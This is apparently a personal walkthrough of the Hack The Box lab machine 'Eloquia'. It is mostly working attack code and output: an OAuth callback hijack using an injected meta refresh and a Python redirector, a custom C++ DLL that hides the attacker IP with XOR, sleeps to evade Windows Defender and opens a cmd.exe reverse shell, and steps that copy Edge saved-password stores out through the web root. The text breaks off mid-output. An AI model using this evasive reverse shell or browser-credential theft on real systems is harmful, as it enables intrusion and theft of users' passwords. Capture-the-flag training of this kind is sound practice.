- - - 
created : 14-12-2025 

Tags : #insane 

Released on 13 Dec 2025 (Season 9)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eloquia/user]
└─$ rustscan -a eloquia.htb -- -A 
Open 10.10.11.99:80
Open 10.10.11.99:5985

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Eloquia
|_http-favicon: Unknown favicon MD5: 7487AC79D09DE6E54F3DF799C6B5B14A
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS

5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   35.22 ms 10.10.14.1
2   35.44 ms eloquia.htb (10.10.11.99)
```
# Enumeration
## HTTP (80)

Visit the website:

![Pasted image 20251214162253.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251214162253.png)

We can register a new account here.       my pass: R7FBAxmwQ4&K%UU3gYad
### Dirsearch

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) or [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eloquia/user]
└─$ dirsearch -u http://eloquia.htb 

0B  - /about  ->  /about/                               
0B  - /accounts/login  ->  /accounts/login/ 
0B  - /contact  ->  /contact/
```
## FFuf

 [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to spot subdomains/vhosts:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eloquia/user]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.eloquia.htb' -u http://eloquia.htb -fs 142 -c

:: Progress: [20481/20481] :: Job [1/1] :: 1156 req/sec :: Duration: [0:00:19] :: Errors: 0 ::  
```
# Exploit
## OAuth 2.0 Race Condition

Login with your account. 

The **Report** feature immediately flags a **Client-Side Attack** vector (XSS or CSRF). If an Admin Bot visits our link, we can target their browser.

Add qooqle.htb to /ect/hosts file:

```go
10.10.11.99 eloquia.htb qooqle.htb
```

Register a `Qooqle` account and bind it to yours capturing the requests: http://qooqle.htb/oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/

![Pasted image 20251214164508.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251214164508.png)

Get the **OAuth** code: 

```bash
GET /oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/ HTTP/1.1
Host: qooqle.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://qooqle.htb/login/?next=/oauth2/authorize/%3Fclient_id%3DriQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//eloquia.htb/accounts/oauth2/qooqle/callback/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=uU9rX2gyhziuGTXBC8ruEqvwI0U3DSVT; sessionid=oezgvysrn60hklpcnu31zs32mr85i1vh
```

```bash
GET /accounts/oauth2/qooqle/callback/?code=PUCq69Up5qRxmV2TzKexnmhPv1Meuf HTTP/1.1
Host: eloquia.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=zO4jJxiX6yOwTUJinMEHHkrkfhqfHw2b
```

**The Vulnerability:** the application does not strictly validate the `state` parameter to bind the request to the specific user session initiating it (or the session is predictable). More importantly, the `/auth/callback` endpoint blindly trusts the `code` parameter. If any logged-in user visits this URL with a valid code, that account becomes linked to their profile.

**The Exploit:** we can trick the **Admin Bot** into visiting a URL containing our code, the system will link our account to the Admin’s Eloquia account. We can then log in and hijack the admin’s session.

1. **The Time-To-Live (TTL) of the Code:** The Google Authorization Code is valid for a maximum of **30 to 60 seconds**. Once generated, it must be used immediately.
2. **The Bot Schedule:** The Admin Bot is not real-time. It processes the “Reported Posts” queue on a cron job every **3 minutes**.

**The Paradox:** If we generate a code now and send the link to the bot, the code will expire 2.5 minutes before the bot ever clicks the link. We need the code to be generated _exactly_ when the bot arrives.

**The Redirector**
We need a custom attack infrastructure. We cannot send the bot directly to Eloquia. We must send the bot to a server we control, hold the connection open, generate a fresh code manually, and then redirect the bot.

Create article with meta refresh to callback to your URL and grab `admin` **OAuth**, we have limited time here as explained.

The editor allows HTML injection so you can just hit the meta refresh in the description:

```html
<meta http-equiv="refresh" content="0;url=http://10.10.14.121/exploit"/>
```

Prepare the `redirector.py` script: "http://qooqle.htb/oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/"

```python
import socket
import time

HOST = '0.0.0.0'
PORT = 80

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    
    print(f"[*] Redirector listening on {PORT}...")
    print("[*] Submit your report to the Admin Bot NOW.")
    
    while True:
        client_connection, client_address = server_socket.accept()
        request = client_connection.recv(1024).decode()
        
        # Check if it's the Admin Bot
        if "GET /exploit" in request:
            print(f"\n[!] HIT! Admin Bot connected from {client_address[0]}")
            print("[!] The connection is HANGING. You have ~30 seconds.")
            print("[*] Go generate a FRESH Google Auth Code manually!")
            
            # This input blocks the response, effectively hanging the bot's request
            fresh_code = input(">>> PASTE THE NEW CODE HERE: ").strip()
            
            # Construct the malicious redirect
            target_url = f"http://eloquia.htb/accounts/oauth2/qooqle/callback/?code={fresh_code}"
            
            http_response = (
                "HTTP/1.1 302 Found\r\n"
                f"Location: {target_url}\r\n"
                "Content-Length: 0\r\n"
                "Connection: close\r\n"
                "\r\n"
            )
            
            client_connection.sendall(http_response.encode())
            client_connection.close()
            print("[+] Redirect snt! Try logging in with Qooqle now.")
            break
        else:
            client_connection.close()

if __name__ == "__main__":
    start_server()
```

#### Execution

1. Run `python3 redirector.py`.
2. Report the post.

![Pasted image 20251215150924.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251215150924.png)

![Pasted image 20251214180535.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251214180535.png)
2. Terminal alerts: `[!] HIT! Admin Bot connected`.
3. We click “Link Google Account” in our separate browser window, intercept the redirect, copy the `code`, and drop the request (~30s):

![Pasted image 20251215151140.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251215151140.png)

2. Paste the **OAuth** code into the Python terminal.
3. The Bot is redirected and our `qooqle` connected to his account.
4. We log in with `qooqle` and land on the **Admin Dashboard**.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eloquia/user]
└─$ sudo python3 server.py
[*] Redirector listening on 80...
[*] Submit your report to the Admin Bot NOW.

[!] HIT! Admin Bot connected from 10.10.11.99
[!] The connection is HANGING. You have ~30 seconds.
[*] Go generate a FRESH Google Auth Code manually!
>>> PASTE THE NEW CODE HERE: FCdp4tqudHvf8Blk5ZVwUgmF80b04T
[+] Redirect sent! Try logging in with Qooqle now.
```

We're admin now:

![Pasted image 20251215165252.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251215165252.png)

![Pasted image 20251215170757.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251215170757.png)

We can find the `db` in http://eloquia.htb/dev/sql-explorer/

| sqlite_version() |
| ---------------- |
| 3.45.1           |
## Evasion & DLL Injection

From the admin dashboard you can upload/attach files to articles that you couldn't before. And this gives us the right path to follow.

A feature labeled **“Custom Workflows”** allows admins to upload plugins to extend functionality. The documentation states these plugins must be compiled **Dynamic Link Libraries (DLLs)**.

We can attempt to upload a standard `msfvenom` generated DLL and the upload succeeds, but execution fails. 
The file also disappears from the directory so **Windows Defender Real-time Protection** is active. 
#### Developing a Stealth DLL

To bypass an Insane-level Windows Defender, we must compile a custom C++ DLL:
1. **No Shellcode:** We won’t inject shellcode into memory (which Defender scans). We will use native C++ socket calls.
2. **Encryption:** Strings (IP, Port, “cmd.exe”) will be XOR-encrypted to hide them from static analysis.
3. **Behavioral Evasion:** We will add a `Sleep(5000)` call before execution. Many AV emulators skip long sleeps to save resources.
4. **Export Compliance:** We must export the specific function the Workflow engine expects (e.g., `RunPlugin`).

To achieve Remote Code Execution **RCE** and a shell on the target we're going to make a `stealth.cpp`.

```c++
#include "sqlite3.h"  // Include SQLite header file
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib") // Link to Winsock library

// Export the entry point that SQLite will call when the DLL is loaded
extern "C" __declspec(dllexport) int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi) {
    
    // 1. Behavioral Evasion: Sleep to timeout emulators
    Sleep(5000);  // Wait for 5 seconds to evade detection

    // 2. String Obfuscation (XOR key: 0x05)
    // "10.10.14.121" -> Encoded bytes
    char ip[] = {0x34, 0x35, 0x2b, 0x34, 0x35, 0x2b, 0x34, 0x31, 0x2b, 0x31, 0x32, 0x31, 0x00};
    // Decryption routine (simplified for writeup)
    for(int i=0; i<12; i++) ip[i] ^= 0x05;  // Decrypt the IP address
    
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    
    // Set up the socket to connect back to the attacker's machine
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(1337);  // Port to connect back to
    server.sin_addr.s_addr = inet_addr("10.10.14.121"); // Use decrypted IP

    // 3. Connect Back to the Attacker's Machine
    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == 0) {
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

        // Redirect pipes to the socket
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        // Spawn cmd.exe to get a reverse shell
        char cmd[] = "cmd.exe";
        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        // Wait for the process to finish
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(sock);  // Close the socket after execution
    }

    WSACleanup();  // Clean up the Winsock library

    return SQLITE_OK;  // Return SQLITE_OK to indicate successful extension loading
}
```

We have to compile this on a Windows machine or using `x86_64-w64-mingw32-gcc` on Linux to generate `plugin.dll`:

```bash
x86_64-w64-mingw32-gcc -shared -o plugin.dll stealth.cpp sqlite3.c -lpthread -lws2_32
```

**The Foothold**

1. Start a listener: `nc -lvnp 1337`.
2. Create a new query:
![Pasted image 20251215181659.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251215181659.png)

3. Upload `plugin.dll`and save, then modify the query with the given name like `plugin_PYGm3aE.dll`:
![Pasted image 20251215175852.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251215175852.png)

The query:

```sql
SELECT load_extension('static/assets/images/blog/plugin.dll');
```

4. Use the SELECT load_extension query and wait 5 seconds (the sleep).
5. Reverse Shell received as  `web`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eloquia/user]
└─$ nc -lvnp 1337   
listening on [any] 1337 ...

connect to [10.10.14.121] from (UNKNOWN) [10.10.11.99] 53910
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Web\Eloquia>whoami
whoami
eloquia\web

C:\Users\web\Desktop>type user.txt
type user.txt
HTB{REDACTED_FLAG}
```
# Privilege Escalation
## Web to Olivia.KAT

We can find some `Microsoft Edge` files here:

```powershell
 Directory of C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default

10/22/2025  10:54 AM    <DIR>          .
10/22/2025  10:54 AM    <DIR>          ..
04/20/2024  11:11 AM            14,722 arbitration_service_config.json
04/20/2024  11:11 AM    <DIR>          Asset Store
04/20/2024  11:11 AM    <DIR>          AssistanceHome
10/21/2025  01:30 PM    <DIR>          AutofillStrikeDatabase
10/21/2025  01:30 PM    <DIR>          blob_storage
10/21/2025  01:30 PM    <DIR>          BudgetDatabase
04/20/2024  11:11 AM    <DIR>          Cache
04/20/2024  11:11 AM    <DIR>          Code Cache
10/21/2025  01:30 PM    <DIR>          commerce_subscription_db
04/20/2024  11:14 AM    <DIR>          Continuous Migration
04/20/2024  11:14 AM            10,240 DashTrackerDatabase
04/20/2024  11:14 AM                 0 DashTrackerDatabase-journal
04/20/2024  11:11 AM    <DIR>          databases
10/21/2025  01:30 PM    <DIR>          DawnGraphiteCache
10/21/2025  01:30 PM    <DIR>          DawnWebGPUCache
04/20/2024  11:11 AM             8,000 default_cloud_config.json
10/21/2025  01:35 PM            28,672 DIPS
10/21/2025  01:35 PM                 0 DIPS-journal
10/21/2025  01:30 PM    <DIR>          discounts_db
04/20/2024  11:11 AM    <DIR>          Download Service
10/21/2025  01:30 PM    <DIR>          DualEngine
04/20/2024  11:11 AM            71,348 Edge Profile.ico
04/20/2024  11:11 AM    <DIR>          EdgeCoupons
04/20/2024  11:11 AM    <DIR>          EdgeEDrop
04/20/2024  11:11 AM    <DIR>          EdgeHubAppUsage
10/21/2025  01:35 PM    <DIR>          EdgePushStorageWithConnectTokenAndKey
04/20/2024  11:11 AM    <DIR>          EntityExtraction
04/20/2024  11:11 AM    <DIR>          Extension Rules
04/20/2024  11:11 AM    <DIR>          Extension Scripts
10/21/2025  01:30 PM    <DIR>          Extension State
04/20/2024  11:11 AM             4,096 ExtensionActivityComp
04/20/2024  11:11 AM                 0 ExtensionActivityComp-journal
04/20/2024  11:11 AM            32,768 ExtensionActivityEdge
04/20/2024  11:11 AM                 0 ExtensionActivityEdge-journal
10/21/2025  01:32 PM            24,576 Favicons
10/21/2025  01:32 PM                 0 Favicons-journal
04/20/2024  11:11 AM    <DIR>          Feature Engagement Tracker
10/21/2025  01:30 PM    <DIR>          GPUCache
04/20/2024  11:11 AM            16,384 heavy_ad_intervention_opt_out.db
04/20/2024  11:11 AM                 0 heavy_ad_intervention_opt_out.db-journal
10/22/2025  10:54 AM           167,936 History
10/22/2025  10:54 AM                 0 History-journal
04/20/2024  11:11 AM            28,672 HubApps Icons
04/20/2024  11:11 AM                 0 HubApps Icons-journal
10/21/2025  01:30 PM           110,592 InterestGroups
10/21/2025  01:30 PM                 0 InterestGroups-journal
10/21/2025  01:25 PM    <DIR>          JumpListIconsRecentClosed
04/20/2024  11:11 AM    <DIR>          JumpListIconsRecentWorkspacesV2
10/22/2025  10:54 AM            45,056 load_statistics.db
04/20/2024  11:11 AM    <DIR>          Local Storage
04/20/2024  11:11 AM                 0 LOCK
10/21/2025  01:30 PM                 0 LOG
10/21/2025  01:23 PM                 0 LOG.old
10/22/2025  10:54 AM            51,200 Login Data
10/22/2025  10:54 AM                 0 Login Data-journal
04/20/2024  11:14 AM            24,576 MediaDeviceSalts
04/20/2024  11:14 AM                 0 MediaDeviceSalts-journal
10/21/2025  01:30 PM    <DIR>          Network
10/21/2025  01:32 PM            53,248 Network Action Predictor
10/21/2025  01:32 PM                 0 Network Action Predictor-journal
04/20/2024  11:11 AM    <DIR>          Nurturing
10/21/2025  01:30 PM    <DIR>          optimization_guide_hint_cache_store
10/21/2025  01:30 PM    <DIR>          parcel_tracking_db
10/21/2025  01:32 PM    <DIR>          Password_Diagnostics
10/21/2025  01:30 PM    <DIR>          PersistentOriginTrials
10/22/2025  10:54 AM            12,867 Preferences
04/20/2024  11:11 AM                33 PreferredApps
04/20/2024  11:14 AM            20,480 PrivateAggregation
04/20/2024  11:14 AM                 0 PrivateAggregation-journal
04/20/2024  11:11 AM    <DIR>          Safe Browsing Network
04/20/2024  11:11 AM            23,927 Secure Preferences
04/20/2024  11:11 AM    <DIR>          Segmentation Platform
10/21/2025  01:30 PM    <DIR>          Session Storage
10/21/2025  01:30 PM    <DIR>          Sessions
04/20/2024  11:11 AM    <DIR>          Shared Dictionary
04/20/2024  11:11 AM                 0 SharedStorage
10/21/2025  01:30 PM    <DIR>          shared_proto_db
10/21/2025  01:31 PM            20,480 Shortcuts
10/21/2025  01:31 PM                 0 Shortcuts-journal
10/21/2025  01:30 PM    <DIR>          Site Characteristics Database
04/20/2024  11:11 AM    <DIR>          Sync Data
10/21/2025  01:24 PM            20,480 Top Sites
10/21/2025  01:24 PM                 0 Top Sites-journal
10/21/2025  01:32 PM           131,072 Visited Links
10/22/2025  10:54 AM           229,376 Web Data
10/22/2025  10:54 AM                 0 Web Data-journal
10/21/2025  01:32 PM            14,336 WebAssistDatabase
10/21/2025  01:32 PM                 0 WebAssistDatabase-journal
04/20/2024  11:11 AM    <DIR>          WebStorage
04/20/2024  11:11 AM    <DIR>          Workspaces
              46 File(s)      1,165,137 bytes
              46 Dir(s)   4,178,653,184 bytes free


type "./Login Data"

SQLite format @  .v��▒��
y����y&Qlogins_edge_extended_table_version3Cedge_breached_table_version3;last_compatible_version40
                                                                                                  ersion41#mmap_status-1
������&Qlogins_edge_extended_table_versionCedge_breached_table_versionlast_compatible_version
                                                                                             ersion# mLT�4T�<5us
https://chatgpt.com/olivia.katv10��;'@ct��~��{�B-�I]��t�K���QQ�CQbD��W���k*https://chatgpt.com//�Z!xnuLl/�Z!x�h�:3
https://openai.com/olivia.katv10*y#/H�±=�+�&���\[��     n^rd���#���쩺%Ԋ!bhttps://openai.com//u"�!LnullLu"�!L�d�05
�t�L���g�https://eloquia.htb//�HIsnull/�HIs�� QQ!nd��/:��
�o�)l.����pis��Y6���M���~���n/�in/http://eloquia.htb/accounts/login/usernameOlivia.KATpasswordv10
SFhttp://eloquia.htb//�H8��"http://eloquia.htb/accounts/login/"http://eloquia.htb/accounts/login/   usernametext����'passworpassword����null/�H8)|-/�H8���
����ps://eloquia.htb/testhttps://eloquia.htb/t.com/45livia.KATpasswordhttp://eloquia.htb/83
logins
▒5logins_edge_extended
������▒5https://chatgpt.com/3http://eloquia.htb/3https://openai.com/▒5https://eloquia.htb/
�g�b:�t++�'99�itablesync_entities_metadatasync_entities_metadatCREATE TABLE sync_entities_metadata (storage_key INTEGER PRIMARY KEY AUTOINCREMENT, metadata VARCHAR NOT NULL)R'sindexlogins_signonloginsCREATE INDEX logins_signon ON logins (signon_realm)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�U�tableloginsloginsCREATE TABLE logins (origin_url VARCHAR NOT NULL, action_url VARCHAR, username_element VARCHAR, username_value VARCHAR, password_element VARCHAR, password_value BLOB, submit_element VARCHAR, signon_realm VARCHAR NOT NULL, date_created INTEGER NOT NULL, blacklisted_by_user INTEGER NOT NULL, scheme INTEGER NOT NULL, password_type INTEGER, times_used INTEGER, form_data BLOB, display_name VARCHAR, icon_url VARCHAR, federation_url VARCHAR, skip_zero_click INTEGER, generation_upload_status INTEGER, possible_username_pairs BLOB, id INTEGER PRIMARY KEY AUTOINCREMENT, date_last_used INTEGER NOT NULL DEFAULT 0, moving_blocked_for BLOB, date_password_modified INTEGER NOT NULL DEFAULT 0, sender_email VARCHAR, sender_name VARCHAR, date_received INTEGER, sharing_notification_displayed INTEGER NOT NULL DEFAULT 0, keychain_identifier BLOB, sender_profile_image_url VARCHAR, UNIQUE (origin_url, username_element, username_value, password_element, signon_realm))+?indexsqlite_autoindex_logins_1loginsf�/tablemetametaCREATE TABLE meta(key LONGVARCHAR NOT NULL UNIQUE PRIMARY KEY, value L��b\�RCHAR)';indexsqlite_autoindex_meta_1meta
X�c�e::t;)�indexforeign_key_index_notespassword_notesCREATE INDEX foreign_key_index_notes ON password_notes (parent_id)�K
                   ))�Qtablepassword_notespassword_notesCREATE TABLE password_notes (id INTEGER PRIMARY KEY AUTOINCREMENT, parent_id INTEGER NOT NULL REFERENCES logins ON UPDATE CASCADE ON DELETE CASCADE DEFERRABLE INITIALLY DEFERRED, key VARCHAR NOT NULL, value BLOB, date_created INTEGER NOT NULL, confidO)indexsqlite_autoindex_password_notes_1password_notest
                                                       /5�indexforeign_key_indexinsecure_credentialsCREATE INDEX foreign_key_index ON insecure_credentials (parent_id)G
[5indexsqlite_autoindex_insecure_credentials_1insecure_credentials
                                                                  �     55�/tableinsecure_credentialsinsecure_credentials
CREATE TABLE insecure_credentials (parent_id INTEGER REFERENCES logins ON UPDATE CASCADE ON DELETE CASCADE DEFERRABLE INITIALLY DEFERRED, insecurity_type INTEGER NOT NULL, create_time INTEGER NOT NULL, is_muted INTEGER NOT NULL DEFAULT 0, trigger_notification_from_backend INTEGER NOT NULL DEFAULT 0, UNIQUE (parent_id, insecurity_type))}3�]tablesync_model_metadatasync_model_metadata  CREATE TABLE sync_model_metadata (id INTEGER PRIMARY KEY AUTOINCREMENT, model_metadata VARCHAR NOT NULL)
 
 
http://eloquia.htb/accounts/login/Olivia.KAT
j�j��#5!https://chatgpt.com/olivia.kat"3!https://openai.com/olivia.kat5https://eloquia.htb/test0Q!   http://eloquia.htb/accounts/login/Olivia.KAT
j�j��#5!https://chatgpt.com/olivia.kat"3!https://openai.com/olivia.kat5https://eloquia.htb/test0Q!   h0����/el0quia.htb/accounts/login/Olivia.KAT
���EO$�N%oindexstats_originstatsCREATE INDEX stats_origin ON stats(origin_domain))=indexsqlite_autoindex_stats_1stats�@�_tablestatsstatsCREATE TABLE stats (origin_domain VARCHAR NOT NULL, username_value VARCHAR, dismissal_count INTEGER, update_time INTEGER NOT NULL, UNIQUE(origin_domain, username_value))�055�tablelogins_edge_extendedlogins_edge_extendedCREATE TABLE logins_edge_extended (id INTEGER PRIMARY KEY AUTOINCREMENT, source VARCHAR NOT null DEFAULT 0, strength_alert_status INTEGER NOT null DEFAULT 0, password_nickname VARCHAR NOT null DEFAULT '' , password_category INTEGER NOT null DEFAULT 0)f5�indexbreached_table_indexbreachedCREATE INDEX breached_table_index ON breached (url, username)/Cindexsqlite_autoindex_breached_1breached��tablebreachedbreachedCREATE TABLE breached (url VARCHAR NOT null, username VARCHAR NOT null, status INTEGER NOT null, alert_state INTEGER NOT null, last_checked_time INTEGER NOT null, sanitized_username VARCHAR, alert_seen INTEGER, last_seen_time INTEGER, UNIQUE (url, username))
```

We can dump login data.

We don't have `sqlite` so if you want to transfer them compress:

```powershell
C:\temp>tar -cvf LoginData.tar "Login Data"
tar -cvf LoginData.tar "Login Data"
a Login Data

C:\temp>tar -cvf WebData.tar "Web Data"
tar -cvf WebData.tar "Web Data"
a Web Data

# Owning file
C:\Users\web\Desktop>icacls "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State" /grant %username%:F
icacls "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State" /grant %username%:F
processed file: C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State
Successfully processed 1 files; Failed processing 0 files

C:\Users\web\Desktop>tar -cvf local_state.tar "C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State" 
tar -cvf local_state.tar "Local State" 
a Local State
```

And move to `/static/assets/images/blog/` then download from web:

```powershell
move LoginData.tar C:\Web\Eloquia\static\assets\images\blog\
move WebData.tar C:\Web\Eloquia\static\assets\images\blog\
move local_state.tar C:\Web\Eloquia\static\assets\images\blog\
```

http://eloquia.htb/static/assets/images/blog/local_state.tar

Decompress on your machine: 

```bash
└─$ tar -xvf LoginData.tar 
Login Data

─$ file Login\ Data 
Login Data: SQLite 3.x database, last written using SQLite version 3045001, page size 2048, file counter 4, database pages 25, cookie 0xe, schema 4, UTF-8, version-valid-for 4
```

Open them:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eloquia/user]
└─$ sqlite3 Login\ Data 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
breached                logins_edge_extended    stats                 
insecure_credentials    meta                    sync_entities_metadata
logins                  password_notes          sync_model_metadata   

sqlite> select * from logins;
https://openai.com/|||olivia.kat||v10*y#/H�±=�+�&���\[��        n^rd���#���쩺%Ԋ!b||https://openai.com/|13358114944404661|0|0|3|0|||||0|0||3|0||13358114944404661|||0|0||
�o�)l.����pis��Y6���M���~���n/�in/|http://eloquia.htb/accounts/login/|username|Olivia.KAT|password|v10
SF||http://eloquia.htb/|13405555954219039|0|0|0|0|0||||0|0||4|13405555945733165||13405555954219445|||0|0||


┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eloquia/user]
└─$ sqlite3 Web\ Data 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
autofill                                 
autofill_edge_block_list                 
autofill_edge_custom_data                
autofill_edge_extended                   
autofill_edge_field_client_info          
autofill_edge_field_values               
autofill_edge_fieldid_cid_mapping        
autofill_edge_frequent_flyer             
autofill_edge_hotel_reservations         
autofill_model_type_state                
autofill_profile_edge_extended           
autofill_sync_metadata                   
autofill_travels                         
benefit_merchant_domains                 
browser_essentials_safety_blocks         
browser_essentials_safety_esm_protections
contact_info                             
contact_info_type_tokens                 
credit_cards                             
credit_cards_edge_extended               
credit_cards_edge_metadata               
edge_meta                                
edge_server_addresses                    
edge_server_addresses_type_tokens        
edge_tokenized_credit_cards              
keywords                                 
local_addresses                          
local_addresses_type_tokens              
local_ibans                              
local_stored_cvc                         
masked_bank_accounts                     
masked_bank_accounts_metadata            
masked_credit_card_benefits              
masked_credit_cards                      
masked_ibans                             
masked_ibans_metadata                    
meta                                     
offer_data                               
offer_eligible_instrument                
offer_merchant_domain                    
payment_method_manifest                  
payments_customer_data                   
plus_address_sync_entity_metadata        
plus_address_sync_model_type_state       
plus_addresses                           
safety_hub_downloads                     
safety_hub_navigations                   
secure_payment_confirmation_instrument   
server_card_cloud_token_data             
server_card_metadata                     
server_credit_cards                      
server_stored_cvc                        
token_service                            
typosquatting_allowed_urls               
unmasked_credit_cards                    
virtual_card_usage_data                  
web_app_manifest_section

sqlite> select * from autofill;
username|Olivia.KAT|olivia.kat|1713640389|1761082345|3

sqlite> select * from autofill_edge_field_values;
8834502079885071589$-3582752561478808691$5227750912938103455|Olivia.KAT|3|1713640369|1761082311|6
8834502079885071589$-3582752561478808691$8488300531103542389|edge_default_dummy_password_value|3|1713640369|1761082311|6

sqlite> select * from autofill_edge_extended;
username|Olivia.KAT|Username|e16eb73a-f60c-4705-b737-b3f3523ca47f|eloquia.htb|16080662894979467255|239111655|1713640389|1761082345|0

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eloquia/root]
└─$ cat Local\ State | jq
{
  "accessibility": {
    "captions": {
      "common_models_path": "",
      "soda_binary_path": ""
    }
  },
  "breadcrumbs": {
    "enabled": false,
    "enabled_time": "13405555428122354"
  },
  "browser": {
    "browser_build_version": "124.0.2478.51",
    "browser_version_of_last_seen_whats_new": "124.0.2478.51",
    "last_seen_whats_new_page_version": "124.0.2478.51"
  },
  "cloned_install": {
    "count": 1,
    "first_timestamp": "1761082237",
    "last_timestamp": "1761082237"
  },
  "continuous_migration": {
    "local_guid": "79b80a6d-92b2-4291-bfbf-52a74d3a4ff4"
  },
  "desktop_session_duration_tracker": {
    "last_session_end_timestamp": "1761159285"
  },
  "dual_engine": {
    "consumer_mode": {
      "ie_usage_checked": "13405555488648607",
      "ie_usage_times": []
    }
  },
  "edge": {
    "manageability": {
      "edge_last_active_time": "13405632885002919"
    },
    "mitigation_manager": {
      "renderer_app_container_compatible_count": 1,
      "renderer_code_integrity_compatible_count": 1
    },
    "perf_center": {
      "efficiency_mode_v2_is_active": false,
      "performance_mode": 3,
      "performance_mode_is_on": false
    },
    "tab_stabs": {
      "closed_without_unfreeze_never_unfrozen": 0,
